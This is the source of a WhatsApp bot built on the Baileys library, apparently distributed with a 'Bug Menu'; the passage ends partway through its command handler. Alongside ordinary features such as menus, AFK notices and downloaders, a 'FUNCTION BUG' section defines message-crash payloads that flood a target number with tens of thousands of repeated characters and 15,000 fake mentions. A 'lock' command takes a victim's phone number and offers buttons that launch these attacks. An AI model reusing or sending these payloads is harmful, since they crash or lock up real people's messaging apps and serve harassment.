require('../setting/config');

const jsobfus = require('javascript-obfuscator')
const JsConfuser = require('js-confuser');
const os = require('os')
const speed = require('performance-now')
const fs = require('fs');
const crypto = require('crypto')
const kripto = require('crypto') 
const axios = require('axios');
const path = require("path");
const cheerio = require('cheerio');
const chalk = require("chalk");
const ytdl = require("@distube/ytdl-core")
const util = require("util");
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)

//ANTILINK
let antilinkall =JSON.parse(fs.readFileSync('./start/lib/database/antilinkall.json'));

//FUNCTION LIB
const uploadFile = require('./lib/uploadFile')
const uploadImage = require('./lib/uploadImage')
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredPremiumCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')

const { default: baileys, proto, generateWAMessage, generateWAMessageContent, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");

module.exports = DanadyaksaDev = async (DanadyaksaDev, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? DanadyaksaDev.user.id.split(":")[0] + "@s.whatsapp.net" || DanadyaksaDev.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const owner = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));
const botNumber = await DanadyaksaDev.decodeJid(DanadyaksaDev.user.id);
const Access = [botNumber, ...owner, ...global.owner];
const isCmd = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const number = m.sender.replace(/@.+/g, '')
    
//ROLE/DATA
let premium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'))
const Creator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium= Creator || checkPremiumUser(m.sender, premium)
        expiredPremiumCheck(DanadyaksaDev, m, premium)
let totalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length  
    
// Group function
const groupMetadata = isGroup ? await DanadyaksaDev.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isAntiLAll = antilinkall.includes(m.chat) ? true : false

// Database
if (global.db.data == null) await loadDatabase()
require('./schema')(DanadyaksaDev, m, chatUpdate, store);
var chats = global.db.data.chats[m.chat],
users = global.db.data.users[m.sender],
settings = global.db.data.settings[botNumber],
limitnya = global.db.data.users[m.sender].limit

//GAME
if(!('hadiah' in db.data.settings)) db.data.settings.hadiah = []
if(!('hadiahkadaluwarsa' in db.data.settings)) db.data.settings.hadiahkadaluwarsa = []
// Function
const { clockString, smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep, formatp, getRandom } = require('./lib/myfunction');
const { ytdl } = require('./lib/scrape/scrape-ytdl');
// Time
const date = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time = moment.tz("Asia/Makassar").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
    
// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
`   ⌬ Pesan: ${m.body || m.mtype} \n` +
`   ⌬ Pengirim: ${m.pushname} \n` +
`   ⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Grup: ${groupName} \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}

try {
ppuser = await DanadyaksaDev.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
// Helper functions
const replyy = (anu) => {
const {message, key} = generateWAMessageFromContent(m.chat, {
interactiveMessage: {
body: {text: anu},
footer: {text: `${global.footer}`},
nativeFlowMessage: {
buttons: [{text: "CREATOR : DanadyaksaDev"}
],
}
},
}, {quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `${body}`}}})
DanadyaksaDev.relayMessage(m.chat, {viewOnceMessage:{message}}, {messageId:key.id})
}

const reaction = async (jidss, emoji) => {
DanadyaksaDev.sendMessage(jidss, { react: { text: emoji, key: m.key }})}
 
//REPLY
async function replymenu(txt) {
DanadyaksaDev.sendMessage(m.chat, {
      video: fs.readFileSync('./start/data/video/thumb.mp4'),
      gifPlayback: true,
      caption: txt,
      contextInfo: {
      externalAdReply: {
      title: namabot,
      body: ownername,
      thumbnailUrl: 'https://pomf2.lain.la/f/asneyvzb.jpg',
      sourceUrl: 'https://youtube.com/@danadyaksadev',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
                    
async function reply(txt) {
const Shikimori = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: namasaluran,
newsletterJid: `${global.idsaluran}`,
},
externalAdReply: {  
showAdAttribution: true,
title: `${namabot}`,
body: 'Subscribe My YouTube',
thumbnailUrl: `${thumbnail}`,
sourceUrl: 'https://www.youtube.com/@danadyaksadev',
},
},
text: txt,
}
return DanadyaksaDev.sendMessage(m.chat, Shikimori, {
quoted: m,
})
}
//FAKE QUOTED
const qsticker = {
key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `footer`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "IDR", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "NIH STICKERMU!!!"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "INR"}}}}

const qpayment = {
key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `footer`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "IDR", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "DanadyaksaDev Nih Boss"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "INR"}}}}

//fpay
const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id:global.botname, participant: '0@s.whatsapp.net'}, message: { requestPaymentMessage: { currencyCodeIso4217: "", "": 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: global.ownername}}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}


const danadyaksa = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `idsaluran`,
newsletterName: `DanadyaksaDev`,
jpegThumbnail: "",
caption: `Danadyaksa V2.0`,
inviteExpiration: Date.now() + 1814400000
}
}
}
//ASYNC
function generateRandomPassword(p) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const length = p;
  let password = 'DanadyaksaDev-';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
//TERDAFTAR
function pengguna() {
 if (!users.registered) return reply(mess.daftar)
}
//LIMIT
function uselimit(r) {
 users.limit -= r
 replyy(`*YOUR LIMIT HAS USE ${r}*\n\n\`LIMITMU SISA ${users.limit}\``)
}
//AI
async function luminai(content, prompt, user) {
  function generateRandomUserId() {
    return 'user-' + Math.floor(Math.random() * 10000);
}
let userId = generateRandomUserId();
console.log(`Generated User ID: ${userId}`);
    try {
        const response = await axios.post('https://luminai.my.id/', { content, prompt, user });
        return response.data;
    } catch (error) {
        console.error(error);
        throw error;
    }
}   
//OBFUS
async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${namabot}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}
//TOTAL FITUR
const totalFitur = () =>{
            var mytext = fs.readFileSync("./start/system.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
}
//AFK
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	     for (let jid of mentionUser) {
            let user = db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            reply(`Please Don't Tag Him\nHe's AFK ${reason ? 'With reason ' + reason : 'no reason'}\nAfk Since ${clockString(new Date - afkTime)}`.trim())
        }
        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            reply(`You Have Returned From AFK\nAFK Reason: ${user.afkReason ? user.afkReason : ''}\nAFK Duration: ${clockString(new Date - user.afkTime)}`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
 //AUTOBIO
if (global.db.data.settings[botNumber].autobio) {
DanadyaksaDev.updateProfileStatus(`DanadyaksaDev Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
}
// AntiLink (Semua Link)
if (isAntiLAll) {
if (budy.match(`https://|http//|//`)) {
if (!isBotAdmins) return m.reply(`Ya kalo gua bukan Admin gua gak bisa hapus pesan nya :(`)
if (isAdmins) return m.reply(`Kalo sesama Admin sih gua gak berani ngehapus`)
if (Creator) return m.reply(`Kamu Owner ku jadi gak masalah`)
await m.reply(`*「 ANTI LINK ALL 」*\n\nLink All Terdeteksi, Maaf pesan kamu saya hapus!!`)
if (m.key.fromMe) return m.reply(`Hehe`)
await DanadyaksaDev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await DanadyaksaDev.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}
}		

//YTDL
async function ytMp4(url) {
    return new Promise(async(resolve, reject) => {
        ytdl.getInfo(url).then(async(getUrl) => {
            let result = [];
            for(let i = 0; i < getUrl.formats.length; i++) {
                let item = getUrl.formats[i];
                if (item.container == 'mp4' && item.hasVideo == true && item.hasAudio == true) {
                    let { qualityLabel, contentLength } = item;
                    let bytes = await bytesToSize(contentLength);
                    result[i] = {
                        video: item.url,
                        quality: qualityLabel,
                        size: bytes
                    };
                };
            };
            let resultFix = result.filter(x => x.video != undefined && x.size != undefined && x.quality != undefined)
            let title = getUrl.videoDetails.title;
            let desc = getUrl.videoDetails.description;
            let views = getUrl.videoDetails.viewCount;
            let likes = getUrl.videoDetails.likes;
            let dislike = getUrl.videoDetails.dislikes;
            let channel = getUrl.videoDetails.ownerChannelName;
            let uploadDate = getUrl.videoDetails.uploadDate;
            let thumb = getUrl.player_response.microformat.playerMicroformatRenderer.thumbnail.thumbnails[0].url;
            resolve({
                title,
                result: resultFix[0].video,
                quality: resultFix[0].quality,
                size: resultFix[0].size,
                thumb,
                views,
                likes,
                dislike,
                channel,
                uploadDate,
                desc
            });
        }).catch(reject);
    });
};

		//=================================================//
		// FUNCTION BUG \\
		//=================================================//

async function DanadyaksaLoc(X, kuwoted) {
  try {
    var atc = generateWAMessageFromContent(X, proto.Message.fromObject({
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: "Y", // Lokasi palsu
                    degreesLongitude: "Y", // Lokasi palsu
                    caption: "📄⃟⃟⃟⃟⃟⃟𝐃⃟⃚͜𝐚𝐧ᯭ𝐚⃚͋𝐝͢𝐲͋𝐚⃚𝐤͋𝐬𝐚⃚͢ᯭ𝐂𝐫𝐭⃟𝄽💔" + "@0".repeat(55000) + "ꦾ". repeat(2000), 
                    sequenceNumber: "0",
                    contextInfo: {
                        mentionedJid: [
                            "0@s.whatsapp.net", 
                            ...Array.from({ length: 15000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                        ]
                    }
                }
            }
        }
   }), {
      userJid: X,  // X = target
      quoted: kuwoted 
    });
    await DanadyaksaDev.relayMessage(X, atc.message, {
      participant: { jid: X }, 
      messageId: atc.key.id
    });
    console.log("Send Fake Location with Tag by Danadyaksa");

     } catch (error) {
    console.error("Failed to send message:", error);
  }
}


const exclusv = 'ꦾ'.repeat(40000);

async function sendFakeLocation(X, kuwoted) {
    try {
        // Mengirimkan pesan dengan relayMessage seperti di frzloc
        await DanadyaksaDev.relayMessage(X, {
            groupMentionedMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            locationMessage: {
                                degreesLatitude: 0,
                                degreesLongitude: 0
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: "📄⃟⃟⃟⃟⃟⃟𝐃⃟⃚͜𝐚𝐧ᯭ𝐚⃚͋𝐝͢𝐲͋𝐚⃚𝐤͋𝐬𝐚⃚͢ᯭ𝐂𝐫𝐭⃟𝄽💔" + "ꦾ".repeat(50000)
                        },
                        nativeFlowMessage: {},
                        contextInfo: {
                            mentionedJid: Array.from({ length: 15000 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: exclusv }]
                        }
                    }
                }
            }
        }, { participant: { jid: X } }, { messageId: null });

        console.log(chalk.green("?AII?"));

        // Mengirimkan pesan dengan generateWAMessageFromContent seperti di DanadyaksaLoc
        var atc = generateWAMessageFromContent(X, proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: "Y", // Lokasi palsu
                        degreesLongitude: "Y", // Lokasi palsu
                        caption: "📄⃟⃟⃟⃟⃟⃟𝐃⃟⃚͜𝐚𝐧ᯭ𝐚⃚͋𝐝͢𝐲͋𝐚⃚𝐤͋𝐬𝐚⃚͢ᯭ𝐂𝐫𝐭⃟𝄽💔" + "@0".repeat(55000) + "ꦾ".repeat(2000),
                        sequenceNumber: "0",
                        contextInfo: {
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 15000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                            ]
                        }
                    }
                }
            }
        }), {
            userJid: X, // X = target
            quoted: kuwoted
        });

        await DanadyaksaDev.relayMessage(X, atc.message, {
            participant: { jid: X },
            messageId: atc.key.id
        });

        console.log("Send Fake Location with Tag by Danadyaksa");

    } catch (error) {
        console.error("Failed to send message:", error);
    }
}

async function CombinationTag(target, Ptcp = false) {
    const mentionedJid = [
        "0@s.whatsapp.net", 
        ...Array.from({ length: 15000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];

    const contextInfo = {
        mentionedJid, 
        stanzaId: "1234567890ABCDEF", 
        participant: "0@s.whatsapp.net",
        quotedMessage: { 
            callLogMesssage: { 
                isVideo: true, 
                callOutcome: "1", 
                durationSecs: "0", 
                callType: "REGULAR",
                participants: [{ jid: "0@s.whatsapp.net", callOutcome: "1" }] 
            } 
        },
        remoteJid: target, 
        forwardingScore: 9999999, 
        isForwarded: true,
        externalAdReply: { 
            title: "", 
            body: "", 
            mediaType: "VIDEO", 
            renderLargerThumbnail: true,
            thumbnail: "https://pomf2.lain.la/f/asneyvzb.jpg", 
            sourceUrl: "https://www.instagram.com/WhatsApp" 
        }
    };

    try {
        await DanadyaksaDev.relayMessage(target, { 
            extendedTextMessage: { 
                text: "📄⃟⃟⃟⃟⃟⃟𝐃⃟⃚͜𝐚𝐧ᯭ𝐚⃚͋𝐝͢𝐲͋𝐚⃚𝐤͋𝐬𝐚⃚͢ᯭ𝐂𝐫𝐭⃟𝄽☣" + "@0".repeat(90000), 
                contextInfo 
            } 
        }, Ptcp ? { participant: { jid: target } } : {});
        
        console.log(chalk.red.bold("Process Send Crashed On Target"));
    } catch (error) {
        console.log(chalk.red.bold("Process Send Crashed By Danadyaksa"), error);
    }
}


		//=================================================//
		// END FUNCTION BUG \\
		//=================================================//
// Command handler
switch (command) {
case 'halo': {
if (!users.registered) return reply(msg.daftar)
const dndyksa = `
*Hi*, ${pushname}! 
${ucapanWaktu}!, 
> I'm *Danadyaksa* 
This Bot Whatsapp With Type JavaScript.
Developed By *DanadyaksaDev*

 ╭─❏「 *ㄊ ☇ Information User* 」
 │ ｢ㄔ *Developer: DanadyaksaDev*
 │ ｢ㄔ *BotName: ${global.botname}*
 │ ｢ㄔ *Version: ${global.version}*
 │ ｢ㄔ *Date: : ${date}*
 │ ｢ㄔ *Limit: ${db.data.users[sender].limit}*
 │ ｢ㄔ *Status User: ${isPremium ? '𝗣𝗿𝗲𝗺𝗶𝘂𝗺' : '𝗙𝗿𝗲𝗲 𝗨𝘀𝗲𝗿'}*
 │ ｢ㄔ *Runtime: ${runtime(process.uptime())}*
 │ ｢ㄔ *Total User: ${totalreg}*
 │ ｢ㄔ *Total Fitur: ${totalFitur()}*
 │ ｢ㄔ *Type: Case*
 │ ｢ㄔ *Prefix:/*
 ╰──────────────━
 `+readmore+`
 ╭─ ❏「 *ㄊ ☇ Access* 」
 │ ｢ㄔ *Add Access </62/tag>*
 │ ｢ㄔ *Dell Access </62/tag>*
 ╰──────────────━
 ╭─❏「 *ㄊ ☇ Controller* 」
 │ ｢ㄔ *Public </Mode Public>*
 │ ｢ㄔ *Self </Mode Privat>*
 ╰──────────────━
 ╭─❏「 *ㄊ ☇ Bug Menu* 」❏
 ╰─────────────────
 ╭─❏「 *ㄊ ☇ Button Selected* 」
 │  ｢ㄔ *lock </62/@tag>*
 ╰─────────────────
 ╭─❏「 *ㄊ ☇ Manual Selected* 」
 │  ｢ㄔ *lock24j </62/@tag>*
 │  ｢ㄔ *hit24j </62/@tag>*
 │  ｢ㄔ *inv24j </62/@tag>*
 ╰─────────────────
 ╭─❏「 *ㄊ ☇ In Place* 」❏
 │  ｢ㄔ *paket?*
 │  ｢ㄔ *assalamualaikum*
 │  ｢ㄔ *halo*
 │  ｢ㄔ *permisi*
 │  ｢ㄔ *bg?*
 ╰─────────────────
 ╭─❏「 *ㄊ ☇ Owner Menu* 」❏
 │  ｢ㄔ *addcase*
 │  ｢ㄔ *delcase*
 │  ｢ㄔ *sendcase*
 │  ｢ㄔ *getcase*
 │  ｢ㄔ *getfunc*
 │  ｢ㄔ *backup*
 │  ｢ㄔ *eval*
 │  ｢ㄔ *restart*
 │  ｢ㄔ *addlimit*
 │  ｢ㄔ *customsn*
 │  ｢ㄔ *spam-pairing*
 │  ｢ㄔ *bcgc*
 │  ｢ㄔ *buathadiah*
 │  ｢ㄔ *listhadiah*
 │  ｢ㄔ *joingc*
 ╰─────────────────
 ╭─❏「 *ㄊ ☇ Main Menu* 」❏
 │  ｢ㄔ *reportbug*
 │  ｢ㄔ *request*
 │  ｢ㄔ *ceklimit*
 │  ｢ㄔ *ceksn Ⓛ︎*
 │  ｢ㄔ *daftar*
 │  ｢ㄔ *unregister*
 │  ｢ㄔ *reedemcode*
 │  ｢ㄔ *claim/daily*
 ╰─────────────────
 ╭─❏「 *ㄊ ☇ Ai Menu* 」❏
 │  ｢ㄔ *ai </text>*
 │  ｢ㄔ *autoai </on/off>*
 │  ｢ㄔ *gpt4 </text>*
 │  ｢ㄔ *blackbox </text>*
 ╰─────────────────
 ╭─❏「 *ㄊ ☇ Tools Menu* 」❏
 │  ｢ㄔ *enc/encrypt </reply>*
 │  ｢ㄔ *enc2* </reply>*
 │  ｢ㄔ *hard enc/encrypt hard </reply>*
 │  ｢ㄔ *dec/decrypt </reply/dec doc>*
 │  ｢ㄔ *hd Ⓛ︎*
 │  ｢ㄔ *remini Ⓛ︎*
 │  ｢ㄔ *hd2 Ⓛ︎*
 │  ｢ㄔ *remini2 Ⓛ︎*
 │  ｢ㄔ *tourl Ⓛ︎*
 │  ｢ㄔ *get︎*
 │  ｢ㄔ *trackip*
 │  ｢ㄔ *readviewonce Ⓛ︎*
 │  ｢ㄔ *toanime*
 │  ｢ㄔ *smeme*
 │  ｢ㄔ *sticker*
 │  ｢ㄔ *brat*
 │  ｢ㄔ *faketweet*
 ╰─────────────────
 ╭─❏「 *ㄊ ☇ Download Menu* 」❏
 │ ｢ㄔ *tiktokvideo Ⓛ︎*
 │ ｢ㄔ *tiktokslide Ⓛ︎*
 │ ｢ㄔ *gdrive Ⓛ︎*
 │ ｢ㄔ *mediafire Ⓛ︎*
 │ ｢ㄔ *sfiledl Ⓛ︎*
 ╰─────────────────
 ╭─❏「 *ㄊ ☇ Group Menu* 」❏
 │ ｢ㄔ *open*
 │ ｢ㄔ *close*
 │ ｢ㄔ *culik*
 │ ｢ㄔ *sulap*
 │ ｢ㄔ *promote*
 │ ｢ㄔ *demote*
 │ ｢ㄔ *afk*
 │ ｢ㄔ *hidetag*
 │ ｢ㄔ *delete*
 │ ｢ㄔ *antilall on/off*
 ╰─────────────────
 ╭─❏「 *ㄊ ☇ Info Menu* 」❏
 │ ｢ㄔ *script*
 │ ｢ㄔ *ping*
 │ ｢ㄔ *os*
 ╰─────────────────
 ╭─❏「 *ㄊ ☇ Search Menu* 」❏
 │ ｢ㄔ *play Ⓛ︎*
 │ ｢ㄔ *play2 Ⓛ︎*
 │ ｢ㄔ *pinterest Ⓛ︎*
 │ ｢ㄔ *txt2img Ⓛ︎*
 │ ｢ㄔ *ytsearch Ⓛ︎*
 ╰─────────────────
 
> _Powered By © DanadyaksaDev_

> ⓘ Please Don't Call & Spam Me
`;
 await DanadyaksaDev.sendMessage(m.chat, {
 video: { url: 'https://pomf2.lain.la/f/gsdljewa.mp4' }, // Ganti dengan URL video Anda
 gifPlayback: true,
 caption: dndyksa,
 contextInfo: {
 externalAdReply: {
 title: '𝐃𝐚ͯ𝐧͢𝐚͢𝐝𝐲᷍𝐚𝐤͢𝐬͢𝐚𝐈𝐬ͯ𝐇𝐞𝐫𝐞',
 body: 'Creator : DanadyaksaDev',
 thumbnailUrl: 'https://pomf2.lain.la/f/asneyvzb.jpg',
 sourceUrl: `https://linktr.ee/DanadyaksaDev`,
 mediaType: 1,
 renderLargerThumbnail: false
 }
 }
 }, {
 quoted: fpay
 });
 
 // Ganti pembacaan file audio dengan URL
 const audioUrl = 'https://pomf2.lain.la/f/dgmbeac6.mp4'; // Ganti dengan URL audio Anda
 DanadyaksaDev.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
 break;
}

		//=================================================//
		// BUTTON BUG \\
		//=================================================//
		
case 'lock': {
if (!isPremium) return reply(msg.prem)   
if (!q) return reply('send the number!!!') 
let puki = q.replace(/[^0-9]/g, "") 
if (puki.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6281396484112`)   
let mmk = puki + '@s.whatsapp.net'  
    // Menambahkan tombol interaktif
    const msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `\`𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚂𝙲𝚁𝙸𝙿𝚃 𝙳𝙰𝙽𝙰𝙳𝚈𝙰𝙺𝚂𝙰 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 1.5͞\``
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© 𝙳𝚊𝚗𝚊𝚍𝚢𝚊𝚔𝚜𝚊𝙳𝚎𝚟"
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: [{
                            body: proto.Message.InteractiveMessage.Body.fromObject({
                                text: (`𝐀𝐓𝐓𝐀𝐂𝐊 : ${mmk}`)
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "© 𝙳𝚊𝚗𝚊𝚍𝚢𝚊𝚔𝚜𝚊𝙳𝚎𝚟"
                            }),
                            header: proto.Message.InteractiveMessage.Header.fromObject({
    title: `📄⃟⃟⃟⃟⃟⃟𝐃⃟⃚͜𝐚𝐧ᯭ𝐚⃚͋𝐝͢𝐲͋𝐚⃚𝐤͋𝐬𝐚⃚͢ᯭ𝐂𝐫𝐭⃟𝄽💔`,
    hasMediaAttachment: true,
    ...(await prepareWAMessageMedia({
        image: { url: './start/lib/media/menu.jpg' }, // Ganti dengan path gambar thumb.png
    }, {
        upload: DanadyaksaDev.waUploadToServer
    }))
}),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                buttons: [
                                    {
                                        name: "single_select",
                                        buttonParamsJson: JSON.stringify({
                                            title: "𝐀𝐓𝐓𝐀𝐂𝐊 ᝄ 𝐓𝐀𝐑𝐆𝐄𝐓",
                                            sections: [
                                                {
                                                    "title": "𝐀𝐓𝐓𝐀𝐂𝐊 ᝄ 𝐓𝐀𝐑𝐆𝐄𝐓",
                                                    "rows": [
                                                        {
                                                            "header": "𝐋𝐨𝐜𝐤𝟐𝟒𝐣",
                                                            "title": "ᝄ",
                                                            "id": `/lock24j ${mmk}`                                                       }, 
                                                        {
                                                            "header": "𝐇𝐢𝐭𝟐𝟒𝐣",
                                                            "title": "ᝄ",
                                                            "id": `/hit24j ${mmk}`
                                                                                                                                       }, 
                                                        {
                                                            "header": "𝐈𝐧𝐯𝟐𝟒𝐣",
                                                            "title": "ᝄ",
                                                            "id": `/inv24j ${mmk}`
                                                                                                                                       }, 
                                                        {
                                                            "header": "𝐒𝐩𝐚𝐦 𝐏𝐚𝐢𝐫𝐢𝐧𝐠",
                                                            "title": "ᝄ",
                                                            "id": `/spam-pairing ${mmk}`
                                                        }
      
                                                    ]
                                                }
                                            ]
                                        })
                                    },
                                    {
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "々 𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                                            url: "https://www.youtube.com/@danadyksadev",
                                            merchant_url: "https://www.youtube.com/@danadyaksadev"
                                        })
                                    },
                                    {
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "々 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥",
                                            url: "https://whatsapp.com/channel/0029ValmecRIyPtJuLzFD02h",
                                            merchant_url: "https://whatsapp.com/channel/0029ValmecRIyPtJuLzFD02h"
                                        })
                                    }
                                ]
                            })
                        }]
                    })
                })
            }
        }
    }, {});

    await DanadyaksaDev.relayMessage(
            from, msg.message, {
            messageId: msg.key.id
                })              
